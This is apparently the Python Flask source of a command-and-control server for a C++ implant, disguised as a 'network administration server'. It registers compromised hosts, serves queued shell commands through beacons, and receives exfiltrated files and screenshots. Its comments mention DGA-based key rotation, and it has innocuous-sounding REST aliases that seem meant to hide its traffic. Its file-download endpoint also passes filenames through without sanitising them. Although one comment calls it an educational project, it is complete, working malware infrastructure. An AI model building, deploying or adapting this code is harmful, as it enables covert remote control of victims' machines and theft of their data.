"""
Serveur Flask d'administration réseau - Endpoints REST.

Ce module implémente le serveur HTTP REST pour la communication avec les clients
d'administration distants. Il gère l'enregistrement, les heartbeats, la distribution
de tâches et la réception de résultats.

Architecture:
    - POST /register : Enregistrement initial des clients
    - POST /beacon : Heartbeats périodiques (keep-alive)
    - GET /tasks/<client_id> : Récupération des commandes en attente
    - POST /results : Soumission des résultats d'exécution
    - POST /command : Ajout d'une commande à la queue
    - GET /clients : Liste de tous les clients

Exemple d'utilisation:
    >>> python server.py
    [2025-11-24 14:30:00] [INFO] Serveur C2 démarrage sur 0.0.0.0:8080
"""

import json
import time
import base64
import os
import re
import random
import threading
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from datetime import datetime

from flask import Flask, request, jsonify, Response
from logger import setup_logger
from client_manager import ClientManager
from command_queue import CommandQueue
from crypto_utils import encrypt, decrypt
from dashboard_stream import register_dashboard_routes, screenshot_cache, cache_lock

# Initialisation Flask et logger
app = Flask(__name__)
app.config['JSON_AS_ASCII'] = False  # Permet les caractères Unicode dans les réponses JSON
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50 MB max pour les screenshots
logger = setup_logger(__name__, log_file="c2_server.log")

# Gestionnaires principaux
client_manager = ClientManager()
command_queue = CommandQueue()

# Dossier pour stocker les fichiers uploadés par les clients
UPLOADS_DIR = Path(__file__).parent / "uploads"
UPLOADS_DIR.mkdir(exist_ok=True)

# La clé AES sera dérivée automatiquement du DGA (rotation quotidienne)
# Plus besoin de clé hardcodée - Sécurité améliorée


@app.after_request
def add_utf8_header(response: Response) -> Response:
    """
    Ajoute l'en-tête UTF-8 à toutes les réponses JSON pour préserver les caractères Unicode.

    MISE À JOUR : Support du chiffrement AES-256-CBC
    - Si la requête entrante avait le header "X-Encrypted: 1", la réponse est chiffrée
    - Chiffre le JSON avant envoi et ajoute le header X-Encrypted: 1

    Ce middleware garantit que les caractères Unicode (╔═║╚) sont correctement
    transmis du serveur au CLI sans corruption d'encodage.

    Args:
        response: Objet Response Flask

    Returns:
        Response modifiée avec Content-Type: application/json; charset=utf-8
    """
    if response.content_type and 'application/json' in response.content_type:
        response.content_type = 'application/json; charset=utf-8'

        # Si la requête était chiffrée, chiffrer aussi la réponse
        if request.headers.get('X-Encrypted') == '1':
            try:
                # Récupérer le JSON de la réponse
                json_data = response.get_data(as_text=True)

                # Récupérer la clé AES du client (DH ou statique)
                aes_key = get_client_aes_key()

                # Chiffrer avec AES-256-CBC
                encrypted_data = encrypt(json_data, aes_key)

                # Remplacer le body par les données chiffrées
                response.set_data(encrypted_data)

                # Ajouter le header X-Encrypted
                response.headers['X-Encrypted'] = '1'

            except Exception as e:
                logger.error(f"❌ Erreur lors du chiffrement de la réponse: {e}")

    return response


def load_config() -> Dict[str, Any]:
    """
    Charge la configuration du serveur depuis config.json.

    Returns:
        Dictionnaire contenant la configuration (host, port, etc.).

    Raises:
        FileNotFoundError: Si config.json n'existe pas.
        json.JSONDecodeError: Si le fichier JSON est invalide.
    """
    config_path = Path(__file__).parent / "config.json"

    try:
        with open(config_path, "r", encoding="utf-8") as f:
            config = json.load(f)
            logger.info(f"Configuration chargée depuis {config_path}")
            return config
    except FileNotFoundError:
        logger.error(f"Fichier de configuration introuvable: {config_path}")
        raise
    except json.JSONDecodeError as e:
        logger.error(f"Erreur de parsing JSON dans {config_path}: {e}")
        raise


def validate_json_fields(data: Optional[Dict], required_fields: List[str]) -> Tuple[bool, Optional[str]]:
    """
    Valide la présence de champs requis dans une requête JSON.

    Args:
        data: Données JSON reçues (peut être None).
        required_fields: Liste des champs obligatoires.

    Returns:
        Tuple (succès: bool, message_erreur: str | None).

    Exemple:
        >>> valid, error = validate_json_fields({"name": "test"}, ["name", "age"])
        >>> print(valid, error)
        False, "Champ manquant: age"
    """
    if data is None:
        return False, "Requête JSON invalide ou vide"

    for field in required_fields:
        if field not in data:
            return False, f"Champ manquant: {field}"

    return True, None


def sanitize_json_string(data: bytes) -> str:
    """
    Nettoie une chaîne de bytes pour la rendre compatible JSON.

    Supprime les caractères de contrôle invalides qui peuvent causer
    des erreurs de parsing JSON, notamment avec les bordures de tableaux
    ASCII et autres caractères spéciaux Windows.

    Args:
        data: Bytes bruts à nettoyer

    Returns:
        String nettoyée prête pour parsing JSON
    """
    # Essayer UTF-8 d'abord
    try:
        text = data.decode('utf-8')
    except UnicodeDecodeError:
        # Fallback sur latin-1 qui accepte tous les bytes
        text = data.decode('latin-1')

    # Supprimer les caractères de contrôle (sauf newline, tab, carriage return)
    # Les caractères de contrôle sont 0x00-0x1F sauf 0x09 (tab), 0x0A (newline), 0x0D (CR)
    # Aussi supprimer 0x7F (DEL) et les caractères de contrôle étendu 0x80-0x9F
    text = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f]', '', text)

    return text


def get_client_aes_key() -> bytes:
    """
    Récupère la clé AES du client qui fait la requête.

    Utilise le header X-Client-ID pour identifier le client et récupérer
    sa clé AES négociée via Diffie-Hellman.

    Returns:
        Clé AES-256 (32 bytes) du client, ou clé statique par défaut si non trouvée

    Exemple:
        >>> key = get_client_aes_key()
        >>> decrypted = decrypt(encrypted_data, key)
    """
    # Essayer de récupérer le client_id depuis le header
    client_id = request.headers.get('X-Client-ID')

    if client_id:
        # Récupérer la clé négociée pour ce client
        key = client_manager.get_aes_key(client_id)
        if key:
            logger.debug(f"Utilisation de la clé DH pour client {client_id[:8]}...")
            return key
        else:
            logger.debug(f"Clé DH non trouvée pour {client_id[:8]}..., utilisation de la clé statique")

    # Fallback: utiliser la clé statique (rétrocompatibilité)
    from crypto_utils import AES_KEY
    return AES_KEY


def decode_request_data() -> Tuple[Optional[Dict], Optional[str]]:
    """
    Décode les données de la requête en UTF-8 STRICT pour préserver les caractères Unicode.

    MISE À JOUR : Support du chiffrement AES-256-CBC avec clés par client
    - Si header "X-Encrypted: 1" présent : déchiffrer les données avant parsing JSON
    - Utilise la clé DH du client si disponible (via X-Client-ID header)
    - Fallback sur la clé statique sinon (rétrocompatibilité)

    STRATÉGIE SIMPLIFIÉE (Educational Project):
    - FORCER UTF-8 uniquement, avec errors='replace' pour caractères invalides
    - PAS de fallback CP850/Latin-1 qui corrompt les caractères Unicode
    - Sanitization des caractères de contrôle pour compatibilité JSON

    Cette approche garantit que les caractères Unicode (╔═║╚) envoyés par l'implant
    C++ sont correctement préservés de bout en bout.

    Returns:
        Tuple[data_dict, error_message]
        - Si succès: (dict_data, None)
        - Si échec: (None, error_message)

    Exemple:
        >>> data, error = decode_request_data()
        >>> if error:
        >>>     return jsonify({"error": error}), 400
    """
    raw_data = request.get_data()

    if not raw_data:
        return None, "Requête vide"

    # Vérifier si la requête est chiffrée
    is_encrypted = request.headers.get('X-Encrypted') == '1'

    if is_encrypted:
        try:
            # Les données sont du Base64, les décoder en string
            encrypted_str = raw_data.decode('utf-8')

            # Récupérer la clé AES du client (DH ou statique)
            aes_key = get_client_aes_key()

            # Déchiffrer avec AES-256-CBC
            decrypted_str = decrypt(encrypted_str, aes_key)

            # Parser le JSON déchiffré
            try:
                data_dict = json.loads(decrypted_str)
                return data_dict, None
            except json.JSONDecodeError as json_err:
                logger.error(f"❌ JSON invalide après déchiffrement: {json_err}")
                return None, f"JSON invalide: {str(json_err)}"

        except Exception as e:
            logger.error(f"❌ Erreur lors du déchiffrement: {e}")
            return None, f"Erreur de déchiffrement: {str(e)}"

    # FORCER UTF-8 avec remplacement des caractères invalides par '?'
    # errors='replace' évite les UnicodeDecodeError tout en préservant le reste
    try:
        utf8_decoded = raw_data.decode('utf-8', errors='replace')

        # Tenter de parser le JSON directement
        try:
            data_dict = json.loads(utf8_decoded)
            return data_dict, None

        except json.JSONDecodeError as json_err:
            # JSON invalide, probablement des caractères de contrôle
            # Nettoyer UNIQUEMENT les caractères de contrôle (0x00-0x1F sauf \t\n\r, et 0x7F-0x9F)
            # Préserver TOUS les caractères Unicode > 0x9F (dont ╔═║╚)
            cleaned_str = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f]', '', utf8_decoded)

            try:
                data_dict = json.loads(cleaned_str)
                return data_dict, None
            except json.JSONDecodeError as sanitize_err:
                # Échec même après sanitization
                logger.error(f"❌ JSON invalide après sanitization: {sanitize_err}")
                logger.error(f"📄 Preview cleaned_str (first 500 chars): {cleaned_str[:500]}")
                return None, f"JSON invalide: {str(sanitize_err)}"

    except Exception as e:
        # Erreur inattendue (ne devrait jamais arriver avec errors='replace')
        logger.error(f"❌ Erreur inattendue lors du décodage: {e}")
        return None, f"Erreur de décodage: {str(e)}"


def save_uploaded_file(client_id: str, original_path: str, base64_content: str) -> Tuple[bool, str]:
    """
    Sauvegarde un fichier uploadé par un client.

    Args:
        client_id: ID du client qui a uploadé le fichier
        original_path: Chemin original du fichier sur le client
        base64_content: Contenu du fichier encodé en Base64

    Returns:
        Tuple (succès: bool, message/chemin: str)
    """
    try:
        # Décoder le contenu Base64
        file_data = base64.b64decode(base64_content)

        # Extraire le nom du fichier original
        original_filename = os.path.basename(original_path)

        # Créer un nom unique avec timestamp et client_id
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_filename = f"{timestamp}_{client_id[:8]}_{original_filename}"

        # Chemin complet de destination
        dest_path = UPLOADS_DIR / safe_filename

        # Écrire le fichier
        with open(dest_path, 'wb') as f:
            f.write(file_data)

        logger.info(f"📁 Fichier sauvegardé: {safe_filename} ({len(file_data)} bytes)")
        return True, str(dest_path)

    except base64.binascii.Error as e:
        logger.error(f"Erreur décodage Base64: {e}")
        return False, f"Erreur décodage Base64: {e}"
    except Exception as e:
        logger.error(f"Erreur sauvegarde fichier: {e}")
        return False, f"Erreur sauvegarde: {e}"


@app.route('/register', methods=['POST'])
def register_client() -> Tuple[Response, int]:
    """
    Enregistre un nouveau client dans le système.

    Supporte l'échange de clés Diffie-Hellman pour établir une clé AES unique.

    Endpoint: POST /register
    Body attendu: {
        "hostname": str,
        "ip": str,
        "os": str,
        "dh_public_key": str (optionnel) - Clé publique DH du client en Base64
    }

    Returns:
        JSON response avec client_id, status et dh_public_key si DH échange (201 Created).

    Exemple avec DH:
        >>> # Requête
        >>> POST /register
        >>> {"hostname": "PC-WIN10", "ip": "192.168.56.101", "os": "Windows 10",
        >>>  "dh_public_key": "ZGF0YS4uLg=="}
        >>>
        >>> # Réponse
        >>> {"client_id": "550e...", "status": "registered", "dh_public_key": "c2VydmVy..."}
    """
    try:
        # Le premier message /register n'est PAS chiffré (pas encore de clé partagée)
        # On lit le JSON directement sans déchiffrement
        if request.headers.get('X-Encrypted') == '1':
            # Si chiffré (cas de réenregistrement), utiliser la clé statique
            data, decode_error = decode_request_data()
            if decode_error:
                logger.error(f"Erreur décodage requête /register: {decode_error}")
                return jsonify({"error": decode_error}), 400
        else:
            # Premier contact - pas de chiffrement
            data = request.get_json()

        if not data:
            return jsonify({"error": "Données invalides"}), 400

        valid, error = validate_json_fields(data, ["hostname", "ip", "os"])

        if not valid:
            logger.warning(f"Tentative d'enregistrement avec données invalides: {error}")
            return jsonify({"error": error}), 400

        # Enregistrement du client via ClientManager
        client_id = client_manager.register_client(
            hostname=data["hostname"],
            ip=data["ip"],
            os=data["os"],
            is_admin=data.get("is_admin", False)
        )

        logger.info(
            f"Nouveau client enregistré: {data['hostname']} "
            f"({data['ip']}) - ID: {client_id}"
        )

        # Préparer la réponse de base
        response_data = {
            "client_id": client_id,
            "status": "registered"
        }

        # Si le client envoie une clé DH publique, faire l'échange
        client_dh_public = data.get('dh_public_key')
        if client_dh_public:
            try:
                from dh_exchange import DHKeyExchange

                logger.info(f"🔐 Échange DH initié pour {data['hostname']} ({client_id[:8]}...)")

                # Générer notre paire de clés
                dh = DHKeyExchange()
                dh.generate_keypair()

                # Calculer le secret partagé
                shared_secret = dh.compute_shared_secret(client_dh_public)

                # Dériver la clé AES
                aes_key = dh.derive_aes_key(shared_secret)

                # Stocker la clé pour ce client
                client_manager.set_aes_key(client_id, aes_key)

                logger.info(f"🔑 Clé AES dérivée pour {client_id[:8]}... (hash: {aes_key[:8].hex()}...)")

                # Ajouter notre clé publique à la réponse
                response_data['dh_public_key'] = dh.get_public_key_base64()

            except Exception as e:
                logger.error(f"Erreur lors de l'échange DH: {e}", exc_info=True)
                # Ne pas bloquer l'enregistrement si DH échoue
                logger.warning(f"Enregistrement sans DH pour {client_id}")

        # La réponse N'EST PAS chiffrée (le client n'a pas encore dérivé la clé)
        return jsonify(response_data), 201

    except ValueError as e:
        logger.error(f"Erreur de validation: {e}")
        return jsonify({"error": str(e)}), 400
    except Exception as e:
        logger.error(f"Erreur lors de l'enregistrement client: {e}", exc_info=True)
        return jsonify({"error": "Erreur interne du serveur"}), 500


@app.route('/beacon', methods=['POST'])
def beacon() -> Tuple[Response, int]:
    """
    Reçoit un heartbeat d'un client (keep-alive) et retourne les tâches pending.

    Endpoint: POST /beacon
    Body attendu: {"client_id": str, "timestamp": float}

    Returns:
        JSON response confirmant la réception et contenant les tâches (200 OK).

    Exemple:
        >>> # Requête
        >>> POST /beacon
        >>> {"client_id": "550e8400-...", "timestamp": 1732456789.123}
        >>>
        >>> # Réponse
        >>> {"status": "alive", "tasks": [{"task_id": "...", "task_type": "shell", ...}]}
    """
    try:
        # Utiliser decode_request_data() pour gérer le chiffrement
        data, decode_error = decode_request_data()
        if decode_error:
            logger.error(f"Erreur décodage requête /beacon: {decode_error}")
            return jsonify({"error": decode_error}), 400

        valid, error = validate_json_fields(data, ["client_id", "timestamp"])

        if not valid:
            logger.warning(f"Beacon avec données invalides: {error}")
            return jsonify({"error": error}), 400

        client_id = data["client_id"]

        # Mise à jour du beacon via ClientManager
        success = client_manager.update_beacon(client_id)
        if not success:
            logger.warning(f"Beacon reçu d'un client inconnu: {client_id}")
            return jsonify({"error": "Client non enregistré"}), 404

        # Récupérer le client pour logging
        client = client_manager.get_client(client_id)
        if client:
            logger.debug(
                f"Beacon reçu: {client.hostname} ({client.ip}) - ID: {client_id}"
            )

        # Récupérer les tâches pending pour ce client
        pending_tasks = command_queue.get_pending_tasks(client_id, mark_sent=True)
        tasks_list = [task.to_dict() for task in pending_tasks]

        return jsonify({
            "status": "alive",
            "tasks": tasks_list
        }), 200

    except Exception as e:
        logger.error(f"Erreur lors du traitement du beacon: {e}", exc_info=True)
        return jsonify({"error": "Erreur interne du serveur"}), 500


@app.route('/tasks/<client_id>', methods=['GET'])
def get_tasks(client_id: str) -> Tuple[Response, int]:
    """
    Récupère les tâches en attente pour un client spécifique (lecture seule).

    Endpoint: GET /tasks/<client_id>

    Args:
        client_id: UUID du client demandeur.

    Returns:
        JSON response avec la liste des tâches (200 OK).

    Exemple:
        >>> # Requête
        >>> GET /tasks/550e8400-e29b-41d4-a716-446655440000
        >>>
        >>> # Réponse (avec tâches)
        >>> {"tasks": [
        >>>     {"task_id": "abc123...", "task_type": "shell", "params": {"command": "whoami"}}
        >>> ]}
        >>>
        >>> # Réponse (sans tâche)
        >>> {"tasks": []}
    """
    try:
        # Vérifier que le client existe
        client = client_manager.get_client(client_id)
        if not client:
            logger.warning(f"Demande de tâches par un client inconnu: {client_id}")
            return jsonify({"error": "Client non enregistré"}), 404

        # Récupération des tâches pending (sans marquer comme sent - lecture seule)
        pending_tasks = command_queue.get_pending_tasks(client_id, mark_sent=False)
        tasks_list = [task.to_dict() for task in pending_tasks]

        if tasks_list:
            logger.info(
                f"Consultation de {len(tasks_list)} tâche(s) pour client "
                f"{client.hostname} ({client_id})"
            )
        else:
            logger.debug(f"Aucune tâche en attente pour {client_id}")

        return jsonify({"tasks": tasks_list}), 200

    except Exception as e:
        logger.error(f"Erreur lors de la récupération des tâches: {e}", exc_info=True)
        return jsonify({"error": "Erreur interne du serveur"}), 500


@app.route('/results', methods=['POST'])
def submit_results() -> Tuple[Response, int]:
    """
    Reçoit les résultats d'exécution d'une tâche par un client.

    Endpoint: POST /results
    Body attendu: {
        "client_id": str,
        "task_id": str,
        "output": str,
        "status": str ("success" | "error"),
        "error_message": str (optionnel)
    }

    Returns:
        JSON response confirmant la réception (200 OK).

    Exemple:
        >>> # Requête
        >>> POST /results
        >>> {
        >>>     "client_id": "550e8400-...",
        >>>     "task_id": "abc123-...",
        >>>     "output": "DESKTOP\\user",
        >>>     "status": "success"
        >>> }
        >>>
        >>> # Réponse
        >>> {"status": "received"}
    """
    try:
        # Utiliser decode_request_data() au lieu de get_json() pour gérer CP850
        data, decode_error = decode_request_data()
        if decode_error:
            logger.error(f"Erreur décodage requête: {decode_error}")
            return jsonify({"error": decode_error}), 400

        valid, error = validate_json_fields(
            data,
            ["client_id", "task_id", "output", "status"]
        )

        if not valid:
            logger.warning(f"Soumission de résultats avec données invalides: {error}")
            return jsonify({"error": error}), 400

        client_id = data["client_id"]
        task_id = data["task_id"]
        output = data["output"]

        # Log détaillé pour debug Unicode (premiers 200 caractères de l'output)
        output_preview = output[:200].replace("\n", "\\n")
        logger.debug(f"📥 Résultat reçu - Client: {client_id[:8]}... Task: {task_id[:8]}... "
                    f"Output preview (200 chars): {output_preview}...")

        # Enregistrement du résultat via CommandQueue
        success = command_queue.add_result(
            task_id=task_id,
            client_id=client_id,
            output=output,
            status=data["status"],
            error_message=data.get("error_message")
        )

        # Détecter si c'est un upload de fichier [FILE_DATA]filepath|base64content
        if output.startswith("[FILE_DATA]"):
            # Parser le format: [FILE_DATA]filepath|base64content
            try:
                file_info = output[11:]  # Retirer "[FILE_DATA]"
                separator_pos = file_info.find("|")
                if separator_pos > 0:
                    original_path = file_info[:separator_pos]
                    base64_content = file_info[separator_pos + 1:]

                    # Sauvegarder le fichier
                    save_success, save_result = save_uploaded_file(
                        client_id, original_path, base64_content
                    )

                    if save_success:
                        # Mettre à jour l'output pour afficher le chemin local
                        # (optionnel: on pourrait modifier le résultat stocké)
                        logger.info(f"📤 Upload réussi de {client_id[:8]}: {original_path}")
                    else:
                        logger.warning(f"📤 Upload échoué: {save_result}")
            except Exception as e:
                logger.error(f"Erreur parsing FILE_DATA: {e}")

        # Détecter si c'est un screenshot [SCREENSHOT]base64data
        elif output.startswith("[SCREENSHOT]") or output.startswith("[CAPTURE]"):
            try:
                # Supporter les deux préfixes
                if output.startswith("[SCREENSHOT]"):
                    base64_data = output[len("[SCREENSHOT]"):]
                else:
                    base64_data = output[len("[CAPTURE]"):]

                # Décoder le Base64
                image_data = base64.b64decode(base64_data)

                # Générer un nom de fichier unique avec timestamp
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                client_short = client_id[:8]
                filename = f"screenshot_{client_short}_{timestamp}.bmp"
                filepath = UPLOADS_DIR / filename

                # Sauvegarder l'image
                with open(filepath, "wb") as f:
                    f.write(image_data)

                logger.info(f"📸 Screenshot sauvegardé: {filename} ({len(image_data)} bytes)")

                # Mettre à jour le cache du dashboard pour l'affichage temps réel
                with cache_lock:
                    screenshot_cache[client_id] = {
                        "image": base64_data,
                        "timestamp": time.time()
                    }
                logger.debug(f"Cache dashboard mis à jour pour client {client_id[:8]}...")

                # Modifier l'output pour afficher le chemin au lieu du Base64
                # et mettre à jour dans la queue pour que le résultat stocké soit court
                new_output = f"[SCREENSHOT SAVED] {filename} ({len(image_data)} bytes)"

                # Mettre à jour le résultat dans la queue avec le nouveau message
                command_queue.add_result(
                    task_id=task_id,
                    client_id=client_id,
                    output=new_output,
                    status=data["status"],
                    error_message=data.get("error_message")
                )

            except base64.binascii.Error as e:
                logger.error(f"Erreur décodage Base64 screenshot: {e}")
                new_output = f"[SCREENSHOT ERROR] Décodage Base64 échoué: {str(e)}"
                command_queue.add_result(
                    task_id=task_id,
                    client_id=client_id,
                    output=new_output,
                    status="error",
                    error_message=str(e)
                )
            except Exception as e:
                logger.error(f"Erreur sauvegarde screenshot: {e}")
                new_output = f"[SCREENSHOT ERROR] {str(e)}"
                command_queue.add_result(
                    task_id=task_id,
                    client_id=client_id,
                    output=new_output,
                    status="error",
                    error_message=str(e)
                )

        if not success:
            logger.warning(f"Résultats reçus pour tâche inexistante: {task_id}")
            return jsonify({"error": "Tâche non trouvée"}), 404

        # Récupérer le client pour logging
        client = client_manager.get_client(client_id)
        if client:
            status_emoji = "✅" if data["status"] == "success" else "❌"
            logger.info(
                f"{status_emoji} Résultats reçus de {client.hostname} "
                f"- Tâche: {task_id[:8]}... - Status: {data['status']}"
            )

            # Log de l'output si erreur
            if data["status"] == "error":
                logger.debug(f"Erreur d'exécution: {data['output'][:200]}")

        return jsonify({"status": "received"}), 200

    except Exception as e:
        logger.error(f"Erreur lors de la soumission des résultats: {e}", exc_info=True)
        return jsonify({"error": "Erreur interne du serveur"}), 500


# ============================================================================
# NOUVEAUX ENDPOINTS REST API (Rétrocompatibilité)
# ============================================================================

@app.route('/api/v1/init', methods=['POST'])
def api_init() -> Tuple[Response, int]:
    """
    Alias REST pour /register - Enregistrement d'un nouveau client.

    Endpoint: POST /api/v1/init

    Rétrocompatibilité: Appelle la fonction register_client() existante.
    Conventions REST standard de l'entreprise.
    """
    return register_client()


@app.route('/api/v1/health', methods=['POST'])
def api_health() -> Tuple[Response, int]:
    """
    Alias REST pour /beacon - Heartbeat et récupération des tâches.

    Endpoint: POST /api/v1/health

    Rétrocompatibilité: Appelle la fonction beacon() existante.
    Conventions REST standard de l'entreprise.
    """
    return beacon()


@app.route('/api/v1/sync', methods=['POST'])
def api_sync() -> Tuple[Response, int]:
    """
    Alias REST pour /results - Soumission des résultats d'exécution.

    Endpoint: POST /api/v1/sync

    Rétrocompatibilité: Appelle la fonction submit_results() existante.
    Conventions REST standard de l'entreprise.
    """
    return submit_results()


@app.route('/', methods=['GET'])
def index() -> Tuple[Response, int]:
    """
    Endpoint racine - Informations sur le serveur.

    Returns:
        JSON response avec statistiques détaillées.
    """
    try:
        client_stats = client_manager.get_stats()
        queue_stats = command_queue.get_stats()

        return jsonify({
            "server": "C2 Administration Server",
            "status": "running",
            "clients": client_stats,
            "tasks": queue_stats
        }), 200
    except Exception as e:
        logger.error(f"Erreur sur endpoint racine: {e}", exc_info=True)
        return jsonify({"error": "Erreur interne du serveur"}), 500


@app.route('/clients', methods=['GET'])
def list_clients() -> Tuple[Response, int]:
    """
    Liste tous les clients connectés.

    Endpoint: GET /clients

    Returns:
        JSON response avec la liste des clients et leur nombre.

    Exemple:
        >>> # Requête
        >>> GET /clients
        >>>
        >>> # Réponse
        >>> {
        >>>     "clients": [
        >>>         {"client_id": "...", "hostname": "PC-WIN10", "status": "active", ...}
        >>>     ],
        >>>     "count": 1
        >>> }
    """
    try:
        all_clients = client_manager.get_all_clients()
        clients_list = [client.to_dict() for client in all_clients]

        logger.debug(f"Liste clients consultée: {len(clients_list)} client(s)")

        return jsonify({
            "clients": clients_list,
            "count": len(clients_list)
        }), 200

    except Exception as e:
        logger.error(f"Erreur liste clients: {e}", exc_info=True)
        return jsonify({"error": "Erreur interne du serveur"}), 500


@app.route('/command', methods=['POST'])
def add_command() -> Tuple[Response, int]:
    """
    Ajoute une commande à la queue d'un client.

    Endpoint: POST /command
    Body attendu: {
        "client_id": str,
        "task_type": str,
        "params": dict (optionnel)
    }

    Returns:
        JSON response avec task_id et status (201 Created).

    Exemple:
        >>> # Requête
        >>> POST /command
        >>> {
        >>>     "client_id": "550e8400-...",
        >>>     "task_type": "shell",
        >>>     "params": {"command": "whoami"}
        >>> }
        >>>
        >>> # Réponse
        >>> {"status": "queued", "task_id": "abc123-..."}
    """
    try:
        # Utiliser decode_request_data() pour gérer le chiffrement
        data, decode_error = decode_request_data()
        if decode_error:
            logger.error(f"Erreur décodage requête /command: {decode_error}")
            return jsonify({"error": decode_error}), 400

        # Validation champs requis
        valid, error = validate_json_fields(data, ["client_id", "task_type"])
        if not valid:
            logger.warning(f"Ajout commande avec données invalides: {error}")
            return jsonify({"error": error}), 400

        # Vérifier que le client existe
        client = client_manager.get_client(data["client_id"])
        if not client:
            logger.warning(f"Tentative d'ajout commande pour client inconnu: {data['client_id']}")
            return jsonify({"error": "Client non enregistré"}), 404

        # Ajouter la tâche
        params = data.get("params", {})
        task_id = command_queue.add_task(
            client_id=data["client_id"],
            task_type=data["task_type"],
            params=params
        )

        logger.info(
            f"Commande ajoutée: {data['task_type']} pour {client.hostname} "
            f"- Task ID: {task_id[:8]}..."
        )

        return jsonify({
            "status": "queued",
            "task_id": task_id
        }), 201

    except ValueError as e:
        # task_type invalide ou autre erreur de validation
        logger.error(f"Erreur validation commande: {e}")
        return jsonify({"error": str(e)}), 400
    except Exception as e:
        logger.error(f"Erreur ajout commande: {e}", exc_info=True)
        return jsonify({"error": "Erreur interne du serveur"}), 500


@app.route('/results', methods=['GET'])
def get_all_results() -> Tuple[Response, int]:
    """
    Récupère tous les résultats d'exécution stockés.

    Endpoint: GET /results

    Returns:
        JSON response avec la liste de tous les résultats.

    Exemple:
        >>> # Requête
        >>> GET /results
        >>>
        >>> # Réponse
        >>> {
        >>>     "count": 5,
        >>>     "results": [
        >>>         {"task_id": "...", "output": "...", "status": "success", ...},
        >>>         ...
        >>>     ]
        >>> }
    """
    try:
        results = command_queue.get_all_results()

        logger.debug(f"Consultation de tous les résultats: {len(results)} résultat(s)")

        return jsonify({
            "count": len(results),
            "results": results
        }), 200

    except Exception as e:
        logger.error(f"Erreur récupération résultats: {e}", exc_info=True)
        return jsonify({"error": "Erreur interne du serveur"}), 500


@app.route('/results/<task_id>', methods=['GET'])
def get_task_result(task_id: str) -> Tuple[Response, int]:
    """
    Récupère le résultat d'une tâche spécifique.

    Endpoint: GET /results/<task_id>

    Args:
        task_id: UUID de la tâche.

    Returns:
        JSON response avec le résultat de la tâche (200 OK) ou erreur (404).

    Exemple:
        >>> # Requête
        >>> GET /results/550e8400-e29b-41d4-a716-446655440000
        >>>
        >>> # Réponse
        >>> {
        >>>     "task_id": "550e8400-...",
        >>>     "client_id": "abc123-...",
        >>>     "output": "DESKTOP\\Administrator",
        >>>     "status": "success",
        >>>     "error_message": null,
        >>>     "received_at": "2025-11-24T14:35:00"
        >>> }
    """
    try:
        result = command_queue.get_result_dict(task_id)

        if result:
            logger.debug(f"Consultation résultat pour tâche {task_id[:8]}...")
            return jsonify(result), 200
        else:
            logger.warning(f"Résultat introuvable pour tâche {task_id[:8]}...")
            return jsonify({"error": "Result not found"}), 404

    except Exception as e:
        logger.error(f"Erreur récupération résultat: {e}", exc_info=True)
        return jsonify({"error": "Erreur interne du serveur"}), 500


@app.route('/files', methods=['GET'])
def list_uploaded_files() -> Tuple[Response, int]:
    """
    Liste tous les fichiers uploadés par les clients.

    Endpoint: GET /files

    Returns:
        JSON response avec la liste des fichiers.
    """
    try:
        files = []
        for f in UPLOADS_DIR.iterdir():
            if f.is_file():
                files.append({
                    "filename": f.name,
                    "size": f.stat().st_size,
                    "modified": datetime.fromtimestamp(f.stat().st_mtime).isoformat()
                })

        # Trier par date de modification (plus récent en premier)
        files.sort(key=lambda x: x["modified"], reverse=True)

        return jsonify({
            "count": len(files),
            "files": files
        }), 200

    except Exception as e:
        logger.error(f"Erreur liste fichiers: {e}", exc_info=True)
        return jsonify({"error": "Erreur interne du serveur"}), 500


@app.route('/files/<filename>', methods=['GET'])
def download_file(filename: str) -> Tuple[Response, int]:
    """
    Télécharge un fichier uploadé.

    Endpoint: GET /files/<filename>

    Returns:
        Le fichier en téléchargement ou erreur 404.
    """
    try:
        file_path = UPLOADS_DIR / filename

        if not file_path.exists() or not file_path.is_file():
            return jsonify({"error": "Fichier non trouvé"}), 404

        # Lire et retourner le fichier
        with open(file_path, 'rb') as f:
            content = f.read()

        response = Response(content, mimetype='application/octet-stream')
        response.headers['Content-Disposition'] = f'attachment; filename={filename}'
        return response, 200

    except Exception as e:
        logger.error(f"Erreur téléchargement fichier: {e}", exc_info=True)
        return jsonify({"error": "Erreur interne du serveur"}), 500

if __name__ == '__main__':
    """
    Point d'entrée principal du serveur.

    Charge la configuration et démarre le serveur Flask sur l'interface
    et le port spécifiés dans config.json.
    """
    try:
        config = load_config()

        host = config.get("host", "0.0.0.0")
        port = config.get("port", 8080)
        debug = config.get("debug", False)

        logger.info("="*60)
        logger.info("🚀 SERVEUR D'ADMINISTRATION RÉSEAU - DÉMARRAGE")
        logger.info("="*60)
        logger.info(f"📡 Interface: {host}")
        logger.info(f"🔌 Port: {port}")
        logger.info(f"🐛 Mode debug: {'Activé' if debug else 'Désactivé'}")
        logger.info(f"📝 Fichier log: {config.get('log_file', 'c2_server.log')}")
        logger.info(f"⏱️  Beacon timeout: {config.get('beacon_timeout', 30)}s")
        logger.info("="*60)

        # Enregistrer les routes du dashboard
        register_dashboard_routes(app, client_manager, command_queue)
        logger.info("✅ Routes du dashboard enregistrées")

        app.run(host=host, port=port, debug=debug)

    except FileNotFoundError:
        logger.critical("Impossible de démarrer: config.json introuvable")
        exit(1)
    except Exception as e:
        logger.critical(f"Erreur fatale lors du démarrage: {e}", exc_info=True)
        exit(1)
